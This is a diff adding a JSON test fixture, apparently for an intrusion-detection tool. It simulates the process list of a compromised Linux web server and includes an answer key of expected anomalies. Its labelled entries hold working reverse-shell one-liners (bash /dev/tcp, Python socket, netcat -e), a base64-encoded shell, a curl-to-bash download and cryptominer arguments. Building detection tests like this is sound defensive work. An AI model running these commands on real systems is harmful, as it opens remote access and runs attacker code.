@@ -1,0 +1,365 @@
+{
+  "timestamp": "2026-01-16T14:30:00Z",
+  "hostname": "prod-web-01.internal.corp",
+  "platform": "Linux",
+  "kernel": "5.15.0-91-generic",
+  "description": "Compromised state - multiple attack techniques present",
+  "attack_scenario": "Web shell uploaded via vulnerable PHP app, escalated to reverse shell, deployed cryptominer and persistence",
+  "processes": [
+    {
+      "pid": 1,
+      "name": "systemd",
+      "exe": "/usr/lib/systemd/systemd",
+      "cmdline": "/sbin/init",
+      "ppid": 0,
+      "username": "root",
+      "exe_hash": "a3f5b8c2d1e4f6a7b9c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4",
+      "cwd": "/",
+      "status": "sleeping",
+      "create_time": "2026-01-10T08:00:00Z"
+    },
+    {
+      "pid": 456,
+      "name": "systemd-journald",
+      "exe": "/usr/lib/systemd/systemd-journald",
+      "cmdline": "/usr/lib/systemd/systemd-journald",
+      "ppid": 1,
+      "username": "root",
+      "exe_hash": "b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6",
+      "cwd": "/",
+      "status": "sleeping",
+      "create_time": "2026-01-10T08:00:01Z"
+    },
+    {
+      "pid": 512,
+      "name": "sshd",
+      "exe": "/usr/sbin/sshd",
+      "cmdline": "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups",
+      "ppid": 1,
+      "username": "root",
+      "exe_hash": "c5d7e9f1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1b3c5d7",
+      "cwd": "/",
+      "status": "sleeping",
+      "create_time": "2026-01-10T08:00:05Z"
+    },
+    {
+      "pid": 789,
+      "name": "nginx",
+      "exe": "/usr/sbin/nginx",
+      "cmdline": "nginx: master process /usr/sbin/nginx -g daemon on; master_process on;",
+      "ppid": 1,
+      "username": "root",
+      "exe_hash": "d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8",
+      "cwd": "/",
+      "status": "sleeping",
+      "create_time": "2026-01-10T08:00:10Z"
+    },
+    {
+      "pid": 790,
+      "name": "nginx",
+      "exe": "/usr/sbin/nginx",
+      "cmdline": "nginx: worker process",
+      "ppid": 789,
+      "username": "www-data",
+      "exe_hash": "d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8",
+      "cwd": "/",
+      "status": "sleeping",
+      "create_time": "2026-01-10T08:00:10Z"
+    },
+    {
+      "pid": 1234,
+      "name": "redis-server",
+      "exe": "/usr/bin/redis-server",
+      "cmdline": "/usr/bin/redis-server 127.0.0.1:6379",
+      "ppid": 1,
+      "username": "redis",
+      "exe_hash": "f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e4f6a8b0c2d4e6f8a0",
+      "cwd": "/var/lib/redis",
+      "status": "sleeping",
+      "create_time": "2026-01-10T08:00:20Z"
+    },
+    {
+      "pid": 1456,
+      "name": "cron",
+      "exe": "/usr/sbin/cron",
+      "cmdline": "/usr/sbin/cron -f",
+      "ppid": 1,
+      "username": "root",
+      "exe_hash": "a9b1c3d5e7f9a1b3c5d7e9f1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1",
+      "cwd": "/var/spool/cron",
+      "status": "sleeping",
+      "create_time": "2026-01-10T08:00:25Z"
+    },
+    {
+      "pid": 1567,
+      "name": "rsyslogd",
+      "exe": "/usr/sbin/rsyslogd",
+      "cmdline": "/usr/sbin/rsyslogd -n -iNONE",
+      "ppid": 1,
+      "username": "syslog",
+      "exe_hash": "b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e4f6a8b0c2",
+      "cwd": "/",
+      "status": "sleeping",
+      "create_time": "2026-01-10T08:00:30Z"
+    },
+    {
+      "pid": 1789,
+      "name": "dbus-daemon",
+      "exe": "/usr/bin/dbus-daemon",
+      "cmdline": "/usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only",
+      "ppid": 1,
+      "username": "messagebus",
+      "exe_hash": "c1d3e5f7a9b1c3d5e7f9a1b3c5d7e9f1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3",
+      "cwd": "/",
+      "status": "sleeping",
+      "create_time": "2026-01-10T08:00:35Z"
+    },
+    {
+      "pid": 2001,
+      "name": "php-fpm",
+      "exe": "/usr/sbin/php-fpm8.1",
+      "cmdline": "php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)",
+      "ppid": 1,
+      "username": "root",
+      "exe_hash": "d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e4",
+      "cwd": "/",
+      "status": "sleeping",
+      "create_time": "2026-01-10T08:00:40Z"
+    },
+    {
+      "pid": 2002,
+      "name": "php-fpm",
+      "exe": "/usr/sbin/php-fpm8.1",
+      "cmdline": "php-fpm: pool www",
+      "ppid": 2001,
+      "username": "www-data",
+      "exe_hash": "d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e4",
+      "cwd": "/var/www",
+      "status": "sleeping",
+      "create_time": "2026-01-10T08:00:40Z"
+    },
+    {
+      "pid": 2345,
+      "name": "node",
+      "exe": "/usr/bin/node",
+      "cmdline": "/usr/bin/node /opt/app/server.js",
+      "ppid": 1,
+      "username": "appuser",
+      "exe_hash": "e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1b3c5d7e9f1a3b5c7d9e1f3a5b7c9d1e3f5",
+      "cwd": "/opt/app",
+      "status": "sleeping",
+      "create_time": "2026-01-10T08:00:45Z"
+    },
+    {
+      "pid": 2789,
+      "name": "unattended-upgr",
+      "exe": "/usr/bin/python3",
+      "cmdline": "/usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal",
+      "ppid": 1,
+      "username": "root",
+      "exe_hash": "f4a6b8c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4a6",
+      "cwd": "/",
+      "status": "sleeping",
+      "create_time": "2026-01-10T08:00:55Z"
+    },
+
+    {
+      "_comment": "ANOMALY 1: Web shell spawned bash - PHP spawning shell is suspicious",
+      "pid": 15234,
+      "name": "sh",
+      "exe": "/usr/bin/dash",
+      "cmdline": "sh -c whoami; id; uname -a",
+      "ppid": 2002,
+      "username": "www-data",
+      "exe_hash": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
+      "cwd": "/var/www/html/uploads",
+      "status": "sleeping",
+      "create_time": "2026-01-16T14:15:30Z",
+      "anomaly_type": "web_shell_recon",
+      "mitre_technique": "T1059.004"
+    },
+
+    {
+      "_comment": "ANOMALY 2: Reverse shell - bash with network redirection",
+      "pid": 15456,
+      "name": "bash",
+      "exe": "/usr/bin/bash",
+      "cmdline": "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1",
+      "ppid": 15234,
+      "username": "www-data",
+      "exe_hash": "2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3",
+      "cwd": "/var/www/html/uploads",
+      "status": "sleeping",
+      "create_time": "2026-01-16T14:16:00Z",
+      "connections": [
+        {"laddr": "10.0.1.50:45678", "raddr": "203.0.113.66:4444", "status": "ESTABLISHED"}
+      ],
+      "anomaly_type": "reverse_shell",
+      "mitre_technique": "T1059.004"
+    },
+
+    {
+      "_comment": "ANOMALY 3: Process masquerading - named [kworker] but not kernel thread",
+      "pid": 15789,
+      "name": "[kworker/0:2]",
+      "exe": "/tmp/.X11-unix/.cache/kw",
+      "cmdline": "[kworker/0:2]",
+      "ppid": 1,
+      "username": "www-data",
+      "exe_hash": "3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4",
+      "cwd": "/tmp/.X11-unix/.cache",
+      "status": "running",
+      "cpu_percent": 98.5,
+      "create_time": "2026-01-16T14:20:00Z",
+      "anomaly_type": "cryptominer_masquerading",
+      "mitre_technique": "T1036.004"
+    },
+
+    {
+      "_comment": "ANOMALY 4: Hidden executable in /dev/shm",
+      "pid": 15890,
+      "name": "bioset",
+      "exe": "/dev/shm/.../bioset",
+      "cmdline": "/dev/shm/.../bioset -o stratum+tcp://pool.mining.com:3333 -u wallet123",
+      "ppid": 1,
+      "username": "nobody",
+      "exe_hash": "4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5",
+      "cwd": "/dev/shm/...",
+      "status": "running",
+      "cpu_percent": 95.2,
+      "create_time": "2026-01-16T14:22:00Z",
+      "connections": [
+        {"laddr": "10.0.1.50:56789", "raddr": "mining.pool.com:3333", "status": "ESTABLISHED"}
+      ],
+      "anomaly_type": "cryptominer_hidden",
+      "mitre_technique": "T1496"
+    },
+
+    {
+      "_comment": "ANOMALY 5: Persistence via fake systemd service",
+      "pid": 16001,
+      "name": "systemd-helper",
+      "exe": "/var/tmp/.systemd-private-abc123/systemd-helper",
+      "cmdline": "/var/tmp/.systemd-private-abc123/systemd-helper --daemon",
+      "ppid": 1,
+      "username": "root",
+      "exe_hash": "5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6",
+      "cwd": "/var/tmp/.systemd-private-abc123",
+      "status": "sleeping",
+      "create_time": "2026-01-16T14:25:00Z",
+      "anomaly_type": "fake_systemd_persistence",
+      "mitre_technique": "T1543.002"
+    },
+
+    {
+      "_comment": "ANOMALY 6: Python reverse shell from cron",
+      "pid": 16234,
+      "name": "python3",
+      "exe": "/usr/bin/python3",
+      "cmdline": "python3 -c import socket,subprocess,os;s=socket.socket();s.connect((\"203.0.113.66\",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])",
+      "ppid": 1456,
+      "username": "root",
+      "exe_hash": "f4a6b8c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4a6",
+      "cwd": "/root",
+      "status": "sleeping",
+      "create_time": "2026-01-16T14:30:00Z",
+      "connections": [
+        {"laddr": "10.0.1.50:34567", "raddr": "203.0.113.66:8080", "status": "ESTABLISHED"}
+      ],
+      "anomaly_type": "python_reverse_shell_cron",
+      "mitre_technique": "T1059.006"
+    },
+
+    {
+      "_comment": "ANOMALY 7: Deleted binary still running (exe shows deleted)",
+      "pid": 16456,
+      "name": "update-helper",
+      "exe": "/tmp/update-helper (deleted)",
+      "cmdline": "/tmp/update-helper",
+      "ppid": 1,
+      "username": "root",
+      "exe_hash": null,
+      "cwd": "/tmp",
+      "status": "sleeping",
+      "create_time": "2026-01-16T14:18:00Z",
+      "anomaly_type": "deleted_executable",
+      "mitre_technique": "T1070.004"
+    },
+
+    {
+      "_comment": "ANOMALY 8: Netcat listener for persistence",
+      "pid": 16567,
+      "name": "nc",
+      "exe": "/usr/bin/nc.traditional",
+      "cmdline": "nc -lvp 9999 -e /bin/bash",
+      "ppid": 16001,
+      "username": "root",
+      "exe_hash": "6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7",
+      "cwd": "/var/tmp/.systemd-private-abc123",
+      "status": "sleeping",
+      "create_time": "2026-01-16T14:26:00Z",
+      "connections": [
+        {"laddr": "0.0.0.0:9999", "raddr": null, "status": "LISTEN"}
+      ],
+      "anomaly_type": "netcat_backdoor",
+      "mitre_technique": "T1059.004"
+    },
+
+    {
+      "_comment": "ANOMALY 9: Encoded payload execution",
+      "pid": 16789,
+      "name": "bash",
+      "exe": "/usr/bin/bash",
+      "cmdline": "bash -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuNjYvNTU1NSAwPiYx | base64 -d | bash",
+      "ppid": 15456,
+      "username": "www-data",
+      "exe_hash": "2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3",
+      "cwd": "/var/www/html",
+      "status": "sleeping",
+      "create_time": "2026-01-16T14:28:00Z",
+      "anomaly_type": "encoded_payload",
+      "mitre_technique": "T1027"
+    },
+
+    {
+      "_comment": "ANOMALY 10: Curl downloading malware",
+      "pid": 16890,
+      "name": "curl",
+      "exe": "/usr/bin/curl",
+      "cmdline": "curl -s http://203.0.113.66/mal.sh | bash",
+      "ppid": 15456,
+      "username": "www-data",
+      "exe_hash": "7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8",
+      "cwd": "/var/www/html",
+      "status": "running",
+      "create_time": "2026-01-16T14:29:00Z",
+      "anomaly_type": "download_execute",
+      "mitre_technique": "T1105"
+    }
+  ],
+
+  "expected_anomalies": {
+    "new_processes": [
+      {"pid": 15234, "type": "web_shell_recon", "indicator": "PHP spawning shell"},
+      {"pid": 15456, "type": "reverse_shell", "indicator": "/dev/tcp in cmdline"},
+      {"pid": 15789, "type": "cryptominer_masquerading", "indicator": "Fake kernel thread name, exe in /tmp"},
+      {"pid": 15890, "type": "cryptominer_hidden", "indicator": "Exe in /dev/shm with mining args"},
+      {"pid": 16001, "type": "fake_systemd_persistence", "indicator": "Fake systemd in /var/tmp"},
+      {"pid": 16234, "type": "python_reverse_shell", "indicator": "Python socket reverse shell from cron"},
+      {"pid": 16456, "type": "deleted_executable", "indicator": "Binary deleted but process running"},
+      {"pid": 16567, "type": "netcat_backdoor", "indicator": "nc with -e flag"},
+      {"pid": 16789, "type": "encoded_payload", "indicator": "base64 decode piped to bash"},
+      {"pid": 16890, "type": "download_execute", "indicator": "curl piped to bash"}
+    ],
+    "missing_processes": [
+      {"name": "fail2ban-server", "pid": 2567, "concern": "Security tool disabled"},
+      {"name": "nginx worker", "pid": 791, "concern": "Worker killed, possible DoS prep"},
+      {"name": "postgres", "pid": 1024, "concern": "Database service killed"},
+      {"name": "postgres children", "pids": [1025, 1026], "concern": "Database workers missing"}
+    ],
+    "suspicious_parent_child": [
+      {"parent": "php-fpm (2002)", "child": "sh (15234)", "concern": "Web server spawning shell"},
+      {"parent": "cron (1456)", "child": "python3 (16234)", "concern": "Cron running reverse shell"}
+    ]
+  }
+}
